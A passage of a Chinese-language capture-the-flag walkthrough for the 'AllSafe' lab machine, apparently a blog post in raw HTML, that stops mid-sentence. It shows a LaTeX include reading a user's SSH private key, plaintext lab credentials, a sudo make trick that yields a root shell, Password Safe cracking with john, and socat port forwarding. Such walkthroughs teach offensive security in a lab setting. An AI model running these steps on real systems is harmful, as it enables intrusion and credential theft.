class=\"hljs-number\"\u003e2222\u003c/span\u003e\nparker@\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e's password: \n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e重新读取一下 \u003ccode\u003eid_rsa\u003c/code\u003e，和上边一样进行包含即可\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\\lstinputlisting{/home/parker/.ssh/id_rsa}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsAllSafe/image15.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsAllSafe/image16.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e再和上边一样修复一次后进行登录，成功登录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜  AllSafe ssh parker@\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.130\u003c/span\u003e -i fixed_key.txt -p \u003cspan class=\"hljs-number\"\u003e2222\u003c/span\u003e\nparker@153504fd9bcb:~$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e横向移动 - 容器逃逸\u003c/h2\u003e\n\u003ch3\u003eto goddard\u003c/h3\u003e\n\u003cp\u003e进来后我们是在容器里面\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eparker@153504fd9bcb:~$ ls -al /\ntotal \u003cspan class=\"hljs-number\"\u003e68\u003c/span\u003e\ndrwxr-xr-x   \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Oct \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e41\u003c/span\u003e .\ndrwxr-xr-x   \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Oct \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e41\u003c/span\u003e ..\n-rwxr-xr-x   \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root    \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e Oct \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e41\u003c/span\u003e .dockerenv\nlrwxrwxrwx   \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root    \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e May \u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e -\u003e usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\ndrwxr-xr-x   \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e May \u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e boot\ndrwxr-xr-x   \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e root root  \u003cspan class=\"hljs-number\"\u003e340\u003c/span\u003e Oct \u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e 04:\u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e dev\ndrwxr-xr-x   \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Oct \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e41\u003c/span\u003e etc\ndrwxr-xr-x   \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Aug \u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e39\u003c/span\u003e home\nlrwxrwxrwx   \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root    \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e May \u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e lib -\u003e usr/lib\nlrwxrwxrwx   \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root    \u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e May \u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e lib64 -\u003e usr/lib64\ndrwxr-xr-x   \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Aug \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e media\ndrwxr-xr-x   \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Aug \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e mnt\ndrwxr-xr-x   \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Aug \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e opt\ndr-xr-xr-x \u003cspan class=\"hljs-number\"\u003e149\u003c/span\u003e root root    \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e Oct \u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e 04:\u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e proc\ndrwx------   \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Aug \u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e39\u003c/span\u003e root\ndrwxr-xr-x   \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Oct \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e41\u003c/span\u003e run\nlrwxrwxrwx   \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root    \u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e May \u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e sbin -\u003e usr/sbin\ndrwxr-xr-x   \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Aug \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e srv\ndr-xr-xr-x  \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e root root    \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e Oct \u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e 04:\u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e sys\ndrwxrwxrwt   \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Oct \u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e 06:\u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e tmp\ndrwxr-xr-x   \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Aug \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e usr\ndrwxr-xr-x   \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Aug \u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e31\u003c/span\u003e var\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e数据库密码，但是连不上\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eparker@153504fd9bcb:/var/www/intranet$ cat db.php \n\u0026#x3C;?php\n\n$dsn = \u003cspan class=\"hljs-string\"\u003e\"mysql:host=db;dbname=allsafe;charset=utf8\"\u003c/span\u003e;\n$username = \u003cspan class=\"hljs-string\"\u003e\"root\"\u003c/span\u003e;\n$password = \u003cspan class=\"hljs-string\"\u003e\"31jB2rcbG1Pjorbd93eaxHW\"\u003c/span\u003e;\n\n\u003cspan class=\"hljs-keyword\"\u003etry\u003c/span\u003e {\n    $pdo = new PDO($dsn, $username,  $password);\n    $pdo-\u003esetAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n} catch (PDOExecption) {\n    die(\u003cspan class=\"hljs-string\"\u003e\"Connection failed: \"\u003c/span\u003e . $e-\u003egetMessage());\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003email\u003c/code\u003e 里面有东西\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eparker@153504fd9bcb:/var/mail/parker$ cat meeting \nFrom goddard@localhost Thu Aug \u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:05:\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e\nDate: Thu, \u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e Aug \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:05:\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e +\u003cspan class=\"hljs-number\"\u003e0000\u003c/span\u003e\nFrom: goddard@localhost\nTo: parker@localhost\nSubject: Reunión con E-Corp\nMIME-Version: \u003cspan class=\"hljs-number\"\u003e1.0\u003c/span\u003e\nContent-\u003cspan class=\"hljs-type\"\u003eType\u003c/span\u003e: multipart/mixed; boundary=\u003cspan class=\"hljs-string\"\u003e\"BOUNDARY\"\u003c/span\u003e\n\n--BOUNDARY\nContent-\u003cspan class=\"hljs-type\"\u003eType\u003c/span\u003e: text/plain; charset=UTF-\u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e\nContent-Transfer-Encoding: 8bit\n\nHola Oliver,\n\nTe adjunto las notas que armé para la reunión con el cliente.  \nRevisalo y confirmame si llegamos con todo.\n\nSaludos,  \nGideon\n\n--BOUNDARY\nContent-\u003cspan class=\"hljs-type\"\u003eType\u003c/span\u003e: text/plain; name=\u003cspan class=\"hljs-string\"\u003e\"meeting_notes.txt\"\u003c/span\u003e\nContent-Disposition: attachment; filename=\u003cspan class=\"hljs-string\"\u003e\"meeting_notes.txt\"\u003c/span\u003e\nContent-Transfer-Encoding: 7bit\n\nMeeting Notes - E-Corp\n----------------------\n\u003cspan class=\"hljs-number\"\u003e1.\u003c/span\u003e Confirmar agenda con el cliente.\n\u003cspan class=\"hljs-number\"\u003e2.\u003c/span\u003e Revisar documentación técnica.\n\u003cspan class=\"hljs-number\"\u003e3.\u003c/span\u003e Validar acceso al portal con la credencial:\n\n   Clave de acceso: 6D7033386E71556654416130494D314F70306157\n\n\u003cspan class=\"hljs-number\"\u003e4.\u003c/span\u003e Preparar demo corta \u003cspan class=\"hljs-keyword\"\u003edel\u003c/span\u003e servicio.\n--BOUNDARY--\nEOF.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e其中告诉我们这是一个秘钥 \u003ccode\u003e6D7033386E71556654416130494D314F70306157\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e典型 16 进制编码，解出来是 \u003ccode\u003emp38nqUfTAa0IM1Op0aW\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsAllSafe/image17.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e该密码是用户 \u003ccode\u003egoddard\u003c/code\u003e 的密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eparker@153504fd9bcb:/var/mail/parker$ su goddard\nPassword: \ngoddard@153504fd9bcb:/var/mail/parker$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eto root\u003c/h3\u003e\n\u003cp\u003e查看 sudo 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003egoddard@153504fd9bcb:/var/mail/parker$ sudo -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e goddard on 153504fd9bcb:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/usr/sbin\\:/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/sbin\\:/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e, use_pty\n\nUser goddard may run the following commands on 153504fd9bcb:\n    (ALL) NOPASSWD: /usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/make\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e直接提权到 \u003ccode\u003eroot\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003egoddard@153504fd9bcb:/var/mail/parker$ COMMAND=\u003cspan class=\"hljs-string\"\u003e'/bin/sh'\u003c/span\u003e\nsudo make -s --\u003cspan class=\"hljs-built_in\"\u003eeval\u003c/span\u003e=$\u003cspan class=\"hljs-string\"\u003e'x:\\n\\t-'\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"$COMMAND\"\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# \u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# id\u003c/span\u003e\nuid=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root) gid=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root) groups=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root)\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eto cisco\u003c/h3\u003e\n\u003cp\u003e家目录下有一个 \u003ccode\u003epsafe3\u003c/code\u003e 文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# ls\u003c/span\u003e\nsecrets.psafe3\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003ePSAFE3\u003c/code\u003e 文件大多属于 \u003ccode\u003ePassword Safe\u003c/code\u003e。 \u003ccode\u003ePassword Safe\u003c/code\u003e 可让您安全轻松地创建安全加密的用户名/密码列表。\u003c/p\u003e\n\u003cp\u003e因为需要密码才能打开，我们通过 \u003ccode\u003ejohn\u003c/code\u003e 进行爆破\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜  AllSafe pwsafe2john secrets.psafe3 \u003e \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e\n\n➜  AllSafe john --wordlist=/usr/share/wordlists/rockyou.txt \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e \nUsing default \u003cspan class=\"hljs-built_in\"\u003einput\u003c/span\u003e encoding: UTF-\u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e\nLoaded \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e password \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e (pwsafe, Password Safe [SHA256 \u003cspan class=\"hljs-number\"\u003e256\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e256\u003c/span\u003e AVX2 8x])\nCost \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e (iteration count) \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e262144\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eall\u003c/span\u003e loaded hashes\nWill run \u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e OpenMP threads\nPress \u003cspan class=\"hljs-string\"\u003e'q'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e Ctrl-C to abort, almost \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e other key \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e status\nrockandroll      (secret)     \n1g \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e DONE (\u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e51\u003c/span\u003e) \u003cspan class=\"hljs-number\"\u003e0.02321\u003c/span\u003eg/s \u003cspan class=\"hljs-number\"\u003e190.2\u003c/span\u003ep/s \u003cspan class=\"hljs-number\"\u003e190.2\u003c/span\u003ec/s \u003cspan class=\"hljs-number\"\u003e190.2\u003c/span\u003eC/s \u003cspan class=\"hljs-number\"\u003e123456.\u003c/span\u003e.whitetiger\nUse the \u003cspan class=\"hljs-string\"\u003e\"--show\"\u003c/span\u003e option to display \u003cspan class=\"hljs-built_in\"\u003eall\u003c/span\u003e of the cracked passwords reliably\nSession completed. \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到密码 \u003ccode\u003erockandroll\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e文件通过 \u003ccode\u003epassword safe\u003c/code\u003e 打开\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsAllSafe/image18.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003esMpam!xxxxxxxxxxxxxxxxxx\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsAllSafe/image19.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e当前目录文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ecisco@allsafe:~$ ls\ndarkarmy.\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e  user.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e家目录下能读取 user.txt\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ecisco@allsafe:~$ cat user.txt \ne8xxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003edarkarmy.bin\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ecisco@allsafe:~$ strings darkarmy.\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e \n70617373776f72643d64726b32303235210a\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e还是 HEX ，能得到一个密码 \u003ccode\u003edrk2025!\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsAllSafe/image20.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e家目录下隐藏文件 \u003ccode\u003e.unknow\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ecisco@allsafe:~$ cat .unknown\nSi quieres comunicarte con nosotros, no vuelvas a usar los canales habituales.\nA partir de ahora, todo contacto será únicamente a través \u003cspan class=\"hljs-keyword\"\u003edel\u003c/span\u003e canal seguro.\n\nConéctate al servidor de mensajería y entra en la sala:\n    dark-ops\n\nNo intentes usar este acceso para nada más que lo acordado.\nNosotros decidimos cuándo y cómo se conversa.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cblockquote\u003e\n\u003cp\u003e如果您想联系我们，请不要使用常规渠道。\n从现在开始，所有联系都将仅通过安全渠道进行。\u003c/p\u003e\n\u003cp\u003e连接到消息服务器并进入房间：\ndark-ops\u003c/p\u003e\n\u003cp\u003e请勿尝试将此访问权限用于任何未经约定的用途。\n我们决定对话的时间和方式。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e查看正在监听端口，有两个开在本地的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ecisco@allsafe:~$ ss -tulpn\nNetid                  State                   Recv-Q                  Send-Q                                   Local Address:Port                                      Peer Address:Port                  Process                  \nudp                    UNCONN                  \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e                       \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e                                              \u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e68\u003c/span\u003e                                             \u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e:*                                              \ntcp                    LISTEN                  \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e                       \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e                                         \u003cspan class=\"hljs-number\"\u003e127.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e40089\u003c/span\u003e                                          \u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e:*                                              \ntcp                    LISTEN                  \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e                       \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e                                           \u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e                                             \u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e:*                                              \ntcp                    LISTEN                  \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e                       \u003cspan class=\"hljs-number\"\u003e128\u003c/span\u003e                                            \u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e                                             \u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e:*                                              \ntcp                    LISTEN                  \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e                       \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e                                           \u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e2222\u003c/span\u003e                                           \u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e:*                                              \ntcp                    LISTEN                  \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e                       \u003cspan class=\"hljs-number\"\u003e511\u003c/span\u003e                                          \u003cspan class=\"hljs-number\"\u003e127.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e3000\u003c/span\u003e                                           \u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e:*                                              \ntcp                    LISTEN                  \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e                       \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e                                              [::]:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e                                                [::]:*                                              \ntcp                    LISTEN                  \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e                       \u003cspan class=\"hljs-number\"\u003e128\u003c/span\u003e                                               [::]:\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e                                                [::]:*                                              \ntcp                    LISTEN                  \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e                       \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e                                              [::]:\u003cspan class=\"hljs-number\"\u003e2222\u003c/span\u003e                                              [::]:* \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eNode.js 反序列化\u003c/h3\u003e\n\u003cp\u003e3000 端口还是一个 \u003ccode\u003eweb\u003c/code\u003e ，登录框\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsAllSafe/image21.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e将 \u003ccode\u003e3000\u003c/code\u003e 端口转发出来\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e./socat TCP-LISTEN:\u003cspan class=\"hljs-number\"\u003e3001\u003c/span\u003e,fork TCP4:\u003cspan class=\"hljs-number\"\u003e127.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e3000\u003c/span\u003e \u0026#x26;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e是一个登录框，需要三个参数\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsAllSafe/image22.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e分别输入 \u003ccode\u003ecisco\u003c/code\u003e \u003ccode\u003edark-ops\u003c/code\u003e \u003ccode\u003edrk2025!\u003c/code\u003e 提示认证错误\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsAllSafe/image23.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e在 \u003ccode\u003e/vat/log\u003c/code\u003e 中发现 \u003ccode\u003eapp.log\u003c/code\u003e ，不常见\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsAllSafe/image24.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e在里边能得到两个凭据\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsAllSafe/image25.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eDLFJYxLLSzp1x5Ttpsffpg2awuJT5K\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将密码换成 \u003ccode\u003eDLFJYxLLSzp1x5Ttpsffpg2awuJT5K\u003c/code\u003e 